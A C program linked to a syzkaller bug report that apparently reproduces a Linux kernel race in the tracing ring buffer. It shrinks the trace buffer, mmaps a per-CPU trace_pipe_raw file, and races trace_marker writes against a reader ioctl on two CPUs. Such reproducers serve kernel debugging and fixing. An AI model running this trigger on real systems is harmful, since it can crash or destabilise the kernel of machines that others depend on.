// https://syzkaller.appspot.com/bug?id=584c624ba63a8b6709c7e04e055f42e497dba6b7
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

#define TRACE_MMAP_IOCTL_GET_READER _IO('R', 0x20)

int fd_raw;
int fd_marker;
volatile int stop = 0;

void *writer_thread(void *arg) {
    int cpu = *(int *)arg;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) {
        printf("[-] sched_setaffinity writer failed: %s\n", strerror(errno));
    }

    char buf[1000];
    memset(buf, 'A', sizeof(buf));

    while (!stop) {
        if (write(fd_marker, buf, sizeof(buf)) < 0) {
            // Ignore errors
        }
    }
    return NULL;
}

void *reader_thread(void *arg) {
    int cpu = *(int *)arg;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0) {
        printf("[-] sched_setaffinity reader failed: %s\n", strerror(errno));
    }

    while (!stop) {
        ioctl(fd_raw, TRACE_MMAP_IOCTL_GET_READER);
    }
    return NULL;
}

int main() {
    cpu_set_t available_cpus;
    CPU_ZERO(&available_cpus);
    if (sched_getaffinity(0, sizeof(available_cpus), &available_cpus) < 0) {
        printf("[-] sched_getaffinity failed: %s\n", strerror(errno));
        exit(1);
    }
    int cpu0 = -1, cpu1 = -1;
    for (int i = 0; i < CPU_SETSIZE; i++) {
        if (CPU_ISSET(i, &available_cpus)) {
            if (cpu0 == -1) cpu0 = i;
            else if (cpu1 == -1) { cpu1 = i; break; }
        }
    }
    if (cpu0 == -1) cpu0 = 0;
    if (cpu1 == -1) cpu1 = cpu0;

    printf("[+] Using CPU %d for writer, CPU %d for reader\n", cpu0, cpu1);

    int fd_size = open("/sys/kernel/tracing/buffer_size_kb", O_WRONLY);
    if (fd_size < 0) {
        fd_size = open("/sys/kernel/debug/tracing/buffer_size_kb", O_WRONLY);
    }
    if (fd_size >= 0) {
        if (write(fd_size, "1\n", 2) != 2) {
            printf("[-] Failed to write buffer_size_kb: %s\n", strerror(errno));
        } else {
            printf("[+] Set buffer_size_kb to 1\n");
        }
        close(fd_size);
    } else {
        printf("[-] Failed to open buffer_size_kb: %s\n", strerror(errno));
    }

    fd_marker = open("/sys/kernel/tracing/trace_marker", O_WRONLY);
    if (fd_marker < 0) {
        fd_marker = open("/sys/kernel/debug/tracing/trace_marker", O_WRONLY);
        if (fd_marker < 0) {
            printf("[-] Failed to open trace_marker: %s\n", strerror(errno));
            exit(1);
        }
    }
    printf("[+] Opened trace_marker\n");

    char path[256];
    snprintf(path, sizeof(path), "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu0);
    fd_raw = open(path, O_RDONLY | O_NONBLOCK);
    if (fd_raw < 0) {
        snprintf(path, sizeof(path), "/sys/kernel/debug/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu0);
        fd_raw = open(path, O_RDONLY | O_NONBLOCK);
        if (fd_raw < 0) {
            printf("[-] Failed to open trace_pipe_raw: %s\n", strerror(errno));
            exit(1);
        }
    }
    printf("[+] Opened trace_pipe_raw for CPU %d\n", cpu0);

    void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, fd_raw, 0);
    if (map == MAP_FAILED) {
        printf("[-] Failed to mmap trace_pipe_raw: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] mmap successful\n");

    pthread_t writer, reader;
    pthread_create(&writer, NULL, writer_thread, &cpu0);
    pthread_create(&reader, NULL, reader_thread, &cpu1);

    sleep(5);
    stop = 1;

    pthread_join(writer, NULL);
    pthread_join(reader, NULL);

    printf("[+] Done\n");
    return 0;
}